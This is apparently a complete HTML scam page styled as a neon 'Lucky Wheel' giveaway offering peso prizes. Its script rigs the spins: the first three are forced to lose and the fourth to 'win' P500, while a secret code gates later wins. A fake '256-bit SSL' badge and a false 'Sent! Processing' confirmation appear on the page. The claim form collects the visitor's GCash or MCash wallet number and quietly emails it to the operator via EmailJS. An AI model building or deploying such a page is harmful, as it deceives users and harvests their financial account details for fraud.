<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Wheel of Fortune | Neon Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
        
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background-color: #020617;
            color: #f1f5f9;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            margin: 0;
            background-image: radial-gradient(circle at 50% 50%, #1e293b 0%, #020617 100%);
        }

        .page-wrapper {
            display: flex;
            flex-direction: column;
            height: 100vh;
            width: 100%;
            padding: 0.5rem;
            justify-content: space-evenly;
            align-items: center;
        }

        .wheel-container {
            position: relative;
            width: 85vw;
            height: 85vw;
            max-width: 440px;
            max-height: 440px;
        }

        .wheel-outer-decoration {
            position: absolute;
            inset: -12px;
            border-radius: 50%;
            border: 2px solid rgba(59, 130, 246, 0.5);
            background: #0f172a;
            box-shadow: 0 0 30px rgba(37, 99, 235, 0.3), inset 0 0 20px rgba(37, 99, 235, 0.2);
            z-index: 1;
        }

        .led-ring {
            position: absolute;
            inset: -6px;
            border-radius: 50%;
            border: 2px solid transparent;
            border-top-color: #3b82f6;
            animation: spin 3s linear infinite;
            z-index: 2;
            opacity: 0.5;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .pointer {
            position: absolute;
            top: -15px;
            left: 50%;
            transform: translateX(-50%);
            width: 32px;
            height: 42px;
            z-index: 100;
            filter: drop-shadow(0 0 15px #3b82f6);
        }

        .pointer svg {
            fill: #fff;
            stroke: #3b82f6;
            stroke-width: 2;
        }

        .btn-spin {
            background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
            color: white;
            box-shadow: 0 0 20px rgba(37, 99, 235, 0.5);
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            cursor: pointer;
        }

        .btn-spin:hover:not(:disabled) {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(37, 99, 235, 0.8);
        }

        .btn-spin:disabled {
            background: #1e293b !important;
            opacity: 0.6;
            cursor: not-allowed;
            box-shadow: none;
        }

        #wheel-canvas {
            position: relative;
            z-index: 10;
            border-radius: 50%;
            width: 100%;
            height: 100%;
        }

        .wheel-center-hub {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 48px;
            height: 48px;
            background: radial-gradient(circle at 30% 30%, #1e293b, #020617);
            border: 2px solid #3b82f6;
            border-radius: 50%;
            z-index: 20;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 15px rgba(59, 130, 246, 0.6);
        }
        
        .wheel-center-hub::after {
            content: '';
            width: 12px;
            height: 12px;
            background: #3b82f6;
            border-radius: 50%;
            box-shadow: 0 0 15px #3b82f6, 0 0 30px #3b82f6;
            animation: pulse-glow 2s ease-in-out infinite;
        }

        @keyframes pulse-glow {
            0%, 100% { opacity: 0.8; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.2); }
        }

        .panel-backdrop {
            background: rgba(2, 6, 23, 0.98);
            backdrop-filter: blur(15px);
        }

        .panel-hidden {
            opacity: 0 !important;
            visibility: hidden !important;
            pointer-events: none !important;
        }

        .shake {
            animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
        }

        @keyframes shake {
            10%, 90% { transform: translate3d(-1px, 0, 0); }
            20%, 80% { transform: translate3d(2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
        }
    </style>
</head>
<body>

<div id="entrance-system" class="fixed inset-0 z-[200] flex items-center justify-center p-6 bg-slate-950/98 backdrop-blur-xl">
    <div class="bg-slate-900 border border-slate-800 max-w-sm w-full p-8 rounded-[2.5rem] text-center shadow-2xl">
        <div class="w-16 h-16 bg-blue-500/10 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-blue-500/20 shadow-[0_0_15px_rgba(59,130,246,0.2)]">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7" />
            </svg>
        </div>
        <h2 class="text-2xl font-black text-white mb-2 uppercase italic">Congratulations!</h2>
        <p class="text-slate-400 text-[10px] mb-8 font-bold uppercase tracking-widest">You have <span class="text-blue-500">1 FREE SPIN</span></p>
        <button id="claim-btn" class="btn-spin w-full py-4 rounded-xl text-sm font-black uppercase tracking-widest">START NOW</button>
    </div>
</div>

<div class="page-wrapper">
    <div class="text-center">
        <h1 class="text-4xl md:text-6xl font-black tracking-tighter text-white uppercase italic leading-none drop-shadow-[0_0_15px_rgba(59,130,246,0.3)]">
            LUCKY <span class="text-blue-500">WHEEL</span>
        </h1>
    </div>

    <div class="wheel-container">
        <div class="pointer">
            <svg viewBox="0 0 24 30"><path d="M12 30L2 10C2 5 6 0 12 0s10 5 10 10L12 30z" /></svg>
        </div>
        <div class="wheel-outer-decoration"></div>
        <div class="led-ring"></div>
        <div class="wheel-center-hub"></div>
        <canvas id="wheel-canvas"></canvas>
    </div>

    <div class="w-full max-w-xs flex flex-col items-center gap-4">
        <button id="spin-btn" class="btn-spin w-full py-5 rounded-2xl text-xl font-black uppercase tracking-widest">SPIN NOW</button>
        <div class="flex items-center gap-2">
            <span class="w-1.5 h-1.5 rounded-full bg-green-500 shadow-[0_0_8px_#22c55e]"></span>
            <span class="text-[8px] font-black text-slate-500 uppercase tracking-widest">Secure • 256-bit SSL</span>
        </div>
    </div>
</div>

<!-- SECRET CODE PANEL -->
<div id="bonus-panel" class="fixed inset-0 z-[500] panel-backdrop flex items-center justify-center p-6 panel-hidden">
    <div class="bg-slate-900 border border-slate-800 max-w-sm w-full p-8 rounded-[2.5rem] text-center shadow-2xl">
        <div class="w-16 h-16 bg-blue-500/10 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-blue-500/20 shadow-[0_0_15px_rgba(59,130,246,0.2)]">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
            </svg>
        </div>
        <h2 class="text-xl font-black text-white mb-2 uppercase italic">Bonus Opportunity</h2>
        <p class="text-slate-400 text-[10px] mb-6 font-bold uppercase tracking-widest leading-relaxed">Enter secret code for a <span class="text-blue-500">FINAL BONUS SPIN</span></p>
        
        <div id="code-container" class="relative mb-6">
            <input type="text" id="bonus-code-input" placeholder="Secret Code" class="w-full p-4 bg-slate-950 border border-slate-800 rounded-xl text-center text-sm font-black text-white outline-none focus:border-blue-500 uppercase transition-all">
            <p id="code-error" class="hidden text-red-500 text-[10px] font-black uppercase mt-2">Invalid Code</p>
        </div>

        <button id="verify-bonus-btn" class="btn-spin w-full py-4 rounded-xl text-sm font-black uppercase tracking-widest">UNLOCK SPIN</button>
    </div>
</div>

<div id="result-overlay" class="fixed inset-0 z-[400] panel-backdrop flex items-center justify-center p-4 panel-hidden">
    <div class="bg-slate-900 border border-slate-800 max-w-sm w-full p-8 rounded-[2.5rem] text-center shadow-2xl">
        <div id="win-state">
            <div id="status-icon-container" class="w-16 h-16 bg-blue-500/10 text-blue-400 rounded-full flex items-center justify-center mx-auto mb-6 shadow-[0_0_20px_rgba(59,130,246,0.3)]">
                <svg id="status-icon" xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7" /></svg>
            </div>
            <p id="result-badge" class="text-[9px] font-black text-blue-500 uppercase tracking-[0.4em] mb-1">Prize Unlocked</p>
            <h2 id="winner-name" class="text-4xl font-black text-white mb-2 tracking-tighter">---</h2>
            <p id="result-description" class="text-slate-400 text-xs mb-10">Verification protocol complete.</p>
            <button id="continue-to-claim" class="btn-spin w-full py-4 rounded-xl font-black uppercase text-xs tracking-widest">CLAIM REWARD</button>
        </div>

        <div id="claim-state" class="hidden text-left">
            <div class="flex gap-2 mb-6">
                <button id="method-gcash-btn" class="method-btn active flex-1 py-3 rounded-lg font-black text-[9px] uppercase border-2 border-slate-700">GCash</button>
                <button id="method-mcash-btn" class="method-btn flex-1 py-3 rounded-lg font-black text-[9px] uppercase border-2 border-slate-700">MCash</button>
            </div>
            <input type="text" id="wallet-number" maxlength="11" placeholder="Enter Wallet Number" class="w-full p-4 bg-slate-950 border border-slate-800 rounded-xl text-center text-lg font-black text-white mb-6 outline-none focus:border-blue-500">
            <button id="submit-claim" class="btn-spin w-full py-4 rounded-xl font-black uppercase text-xs">CONFIRM WITHDRAWAL</button>
        </div>

        <div id="success-state" class="hidden py-4">
            <div class="text-green-500 text-6xl mb-6 drop-shadow-[0_0_15px_rgba(34,197,94,0.6)]">✓</div>
            <h3 class="text-2xl font-black text-white mb-2 italic uppercase">Sent!</h3>
            <p class="text-[10px] text-slate-400 mb-8 px-4 leading-relaxed">Processing on the network...</p>
            <button id="final-close-btn" class="w-full py-4 bg-slate-800 text-slate-200 rounded-xl font-black uppercase text-[9px]">FINISH</button>
        </div>
    </div>
</div>

<script>
    // --- EMAILJS CONFIG ---
    const EMAILJS_PUBLIC_KEY = "6kFJ7rx7NPWfm4hFb";
    const EMAILJS_SERVICE_ID = "service_8iwx4ft";
    const EMAILJS_TEMPLATE_ID = "template_w33uyv9";
    
    try {
        emailjs.init(EMAILJS_PUBLIC_KEY);
    } catch(e) {
        console.error("EmailJS Init Error:", e);
    }

    const canvas = document.getElementById('wheel-canvas');
    const ctx = canvas.getContext('2d');
    const spinBtn = document.getElementById('spin-btn');
    const resultOverlay = document.getElementById('result-overlay');
    
    let entries = ["P100", "P250", "P500", "P1,000", "Try Again", "Better Luck"];
    let isSpinning = false, startAngle = 0, spinTime = 0;
    const spinTimeTotal = 10000; 
    let currentPrize = "", selectedMethod = "GCash";

    let spinCount = parseInt(localStorage.getItem('neon_spin_count') || "0");
    let isSpecialUser = localStorage.getItem('neon_is_special') === 'true';

    const neonColors = [
        ["#2563eb", "#1d4ed8", "#3b82f6"], ["#db2777", "#be185d", "#f472b6"], 
        ["#059669", "#047857", "#10b981"], ["#d97706", "#b45309", "#fbbf24"], 
        ["#7c3aed", "#6d28d9", "#a78bfa"], ["#dc2626", "#b91c1c", "#f87171"]
    ];

    function drawWheel() {
        const dpr = window.devicePixelRatio || 1;
        const rect = canvas.getBoundingClientRect();
        canvas.width = rect.width * dpr;
        canvas.height = rect.height * dpr;
        ctx.scale(dpr, dpr);

        const cx = rect.width / 2;
        const cy = rect.height / 2;
        const radius = rect.width / 2;
        const arc = (Math.PI * 2) / entries.length;

        ctx.clearRect(0, 0, rect.width, rect.height);

        entries.forEach((text, i) => {
            const angle = startAngle + i * arc;
            const colorPair = neonColors[i % neonColors.length];
            
            ctx.save();
            ctx.beginPath();
            ctx.moveTo(cx, cy);
            ctx.arc(cx, cy, radius, angle, angle + arc);
            
            const grad = ctx.createRadialGradient(cx, cy, 0, cx, cy, radius);
            grad.addColorStop(0, colorPair[1]);
            grad.addColorStop(0.8, colorPair[0]);
            grad.addColorStop(1, '#000');
            
            ctx.fillStyle = grad;
            ctx.fill();
            ctx.strokeStyle = colorPair[2];
            ctx.lineWidth = 1;
            ctx.stroke();

            ctx.translate(cx, cy);
            ctx.rotate(angle + arc / 2);
            ctx.fillStyle = "white";
            ctx.shadowBlur = 10;
            ctx.shadowColor = colorPair[2];

            let fontSize = rect.width / 18;
            ctx.font = `900 ${fontSize}px 'Plus Jakarta Sans'`;
            ctx.textAlign = "right";
            ctx.fillText(text.toUpperCase(), radius * 0.88, fontSize / 3.5);
            ctx.restore();
        });
    }

    function rotateWheel() {
        spinTime += 16;
        if (spinTime >= spinTimeTotal) {
            isSpinning = false;
            const degrees = (startAngle * 180 / Math.PI);
            const arcDeg = 360 / entries.length;
            const index = Math.floor((360 - (degrees + 90) % 360) % 360 / arcDeg);
            currentPrize = entries[index];
            
            const isWin = !currentPrize.toLowerCase().includes("luck") && !currentPrize.toLowerCase().includes("again");
            document.getElementById('winner-name').textContent = currentPrize;
            
            if (isWin) {
                confetti({ particleCount: 150, spread: 80, origin: { y: 0.6 }, colors: ['#3b82f6', '#ffffff', '#1d4ed8'] });
                document.getElementById('continue-to-claim').classList.remove('hidden');
                document.getElementById('result-badge').textContent = "Prize Unlocked";
                document.getElementById('result-description').textContent = "Verification protocol complete.";
                localStorage.setItem('neon_spin_lock_v2', 'true'); 
                lockInterface(); 
            } else {
                document.getElementById('continue-to-claim').classList.add('hidden');
                document.getElementById('result-badge').textContent = "Keep going";
                document.getElementById('result-description').textContent = "Keep going, you still have spin.";
                
                if (spinCount >= 3 && !isWin) {
                    setTimeout(() => {
                        hideOverlay();
                        document.getElementById('bonus-panel').classList.remove('panel-hidden');
                    }, 2500);
                } else {
                    setTimeout(hideOverlay, 2500);
                }
            }
            resultOverlay.classList.remove('panel-hidden');
            return;
        }

        const t = spinTime / spinTimeTotal;
        const ease = 1 - Math.pow(1 - t, 4); 
        startAngle = initialAngle + (totalRotation * ease);
        drawWheel(); 
        requestAnimationFrame(rotateWheel);
    }

    let initialAngle = 0;
    let totalRotation = 0;

    function lockInterface() { 
        spinBtn.disabled = true; 
        spinBtn.textContent = "CLAIMED"; 
    }

    function hideOverlay() {
        resultOverlay.classList.add('panel-hidden');
        setTimeout(() => {
            document.getElementById('win-state').classList.remove('hidden');
            document.getElementById('claim-state').classList.add('hidden');
            document.getElementById('success-state').classList.add('hidden');
        }, 400);
    }

    document.getElementById('verify-bonus-btn').onclick = () => {
        const input = document.getElementById('bonus-code-input');
        const container = document.getElementById('code-container');
        const error = document.getElementById('code-error');
        const codeInput = input.value.trim();
        
        if (codeInput.toLowerCase() === "goodluck") {
            isSpecialUser = true;
            localStorage.setItem('neon_is_special', 'true');
            document.getElementById('bonus-panel').classList.add('panel-hidden');
            spinBtn.disabled = false;
            spinBtn.textContent = "BONUS SPIN";
        } else {
            // SHOW ERROR FEEDBACK
            container.classList.add('shake');
            input.classList.replace('border-slate-800', 'border-red-500');
            error.classList.remove('hidden');
            
            setTimeout(() => {
                container.classList.remove('shake');
            }, 400);
        }
    };

    // Reset error when typing
    document.getElementById('bonus-code-input').oninput = () => {
        const input = document.getElementById('bonus-code-input');
        const error = document.getElementById('code-error');
        input.classList.replace('border-red-500', 'border-slate-800');
        error.classList.add('hidden');
    };

    document.getElementById('method-gcash-btn').onclick = () => {
        selectedMethod = "GCash";
        document.querySelectorAll('.method-btn').forEach(b => b.classList.remove('active', 'border-blue-500'));
        document.getElementById('method-gcash-btn').classList.add('active', 'border-blue-500');
    };
    document.getElementById('method-mcash-btn').onclick = () => {
        selectedMethod = "MCash";
        document.querySelectorAll('.method-btn').forEach(b => b.classList.remove('active', 'border-blue-500'));
        document.getElementById('method-mcash-btn').classList.add('active', 'border-blue-500');
    };
    document.getElementById('continue-to-claim').onclick = () => {
        document.getElementById('win-state').classList.add('hidden');
        document.getElementById('claim-state').classList.remove('hidden');
    };

    document.getElementById('submit-claim').onclick = async () => {
        const val = document.getElementById('wallet-number').value;
        if (val.length < 10) return;
        const btn = document.getElementById('submit-claim');
        btn.disabled = true; 
        btn.textContent = "SENDING...";
        try {
            await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, { prize: currentPrize, method: selectedMethod, user_number: val });
            document.getElementById('claim-state').classList.add('hidden');
            document.getElementById('success-state').classList.remove('hidden');
        } catch(e) { btn.disabled = false; btn.textContent = "RETRY"; }
    };

    document.getElementById('final-close-btn').onclick = hideOverlay;
    document.getElementById('claim-btn').onclick = () => document.getElementById('entrance-system').style.display = 'none';
    
    spinBtn.onclick = () => { 
        if(isSpinning || spinBtn.disabled) return; 

        spinCount++;
        localStorage.setItem('neon_spin_count', spinCount.toString());

        isSpinning = true; 
        spinTime = 0; 
        initialAngle = startAngle;
        
        const arc = (Math.PI * 2) / entries.length;
        let targetIndex = -1;

        if (spinCount === 1) targetIndex = entries.findIndex(e => e === "Try Again");
        else if (spinCount === 2) targetIndex = entries.findIndex(e => e === "Try Again");
        else if (spinCount === 3) targetIndex = entries.findIndex(e => e === "Better Luck");
        else if (spinCount === 4) targetIndex = entries.findIndex(e => e === "P500"); 
        else if (isSpecialUser) {
            const winners = entries.map((e, i) => ({e, i})).filter(o => !o.e.toLowerCase().includes('luck') && !o.e.toLowerCase().includes('again'));
            targetIndex = winners.length > 0 ? winners[Math.floor(Math.random() * winners.length)].i : 0;
        }

        const extraSpins = Math.PI * 2 * 10;
        if (targetIndex !== -1) {
            const currentMod = startAngle % (Math.PI * 2);
            const targetPos = (Math.PI * 1.5) - (targetIndex * arc) - (arc / 2);
            totalRotation = extraSpins + (targetPos - currentMod);
            while (totalRotation < extraSpins) totalRotation += Math.PI * 2;
        } else {
            totalRotation = extraSpins + Math.random() * Math.PI * 2;
        }

        rotateWheel(); 
    };

    window.onresize = drawWheel;
    window.onload = () => { 
        drawWheel(); 
        if(localStorage.getItem('neon_spin_lock_v2')) {
            lockInterface();
        } else if (spinCount >= 3 && !isSpecialUser) {
             spinBtn.disabled = true;
             spinBtn.textContent = "LOCKED";
             document.getElementById('bonus-panel').classList.remove('panel-hidden');
        } else if (isSpecialUser && !localStorage.getItem('neon_spin_lock_v2')) {
             spinBtn.disabled = false;
             spinBtn.textContent = "BONUS SPIN";
        }
    };
</script>
</body>
</html>
